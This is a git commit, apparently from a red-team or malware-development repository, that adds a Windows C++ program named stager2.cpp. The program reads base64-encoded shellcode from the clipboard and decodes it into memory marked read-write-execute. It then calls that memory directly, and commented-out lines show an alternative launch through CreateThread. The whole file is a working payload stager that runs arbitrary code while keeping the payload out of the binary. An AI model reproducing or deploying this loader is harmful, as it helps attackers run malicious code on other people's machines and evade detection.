31f1fe92a858ff0054c46783225b8ee0e3f8fbee
AlienX <64488123+AlienX2001@users.noreply.github.com>
2022-09-15 13:53:08 +0530

    Add files via upload

---
+++ stager2/stager2.cpp
@@ -0,0 +1,29 @@
+#include <windows.h>
+#include <stdio.h>
+#include <wincrypt.h>
+
+#pragma comment(lib, "crypt32.lib")
+
+int main() {
+	printf("Is clipboard open or not: %d\n", OpenClipboard(NULL));
+	printf("Handle of clipboard owner: %x\n", (char*)GetClipboardOwner());
+	DWORD size;
+	//LPVOID payload = VirtualAlloc(NULL, sizeof(buf), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+	//memcpy(payload, buf, sizeof(buf));
+	//HANDLE th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)payload, 0, 0, 0);
+	//WaitForSingleObject(th, -1);
+	if (CryptStringToBinaryA((char*)GetClipboardData(CF_TEXT), 0, CRYPT_STRING_BASE64, NULL, &size, 0, 0) == 0) { printf("Couldnt CryptStringToBinaryA\nQuitting..."); }
+	else {
+		LPVOID payload = VirtualAlloc(NULL, size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+		if (payload == NULL) {
+			printf("VirtualAlloc failed with error code %d", GetLastError());
+		}
+		//char payload[100];
+		CryptStringToBinaryA((char*)GetClipboardData(CF_TEXT), 0, CRYPT_STRING_BASE64, (BYTE *)payload, &size, 0, 0);
+		//char* test = (char*)payload;
+		printf("%lx with size %d", (*(int *)payload), size);
+		((void(*)())payload)();
+	}
+	CloseClipboard();
+	return 0;
+}
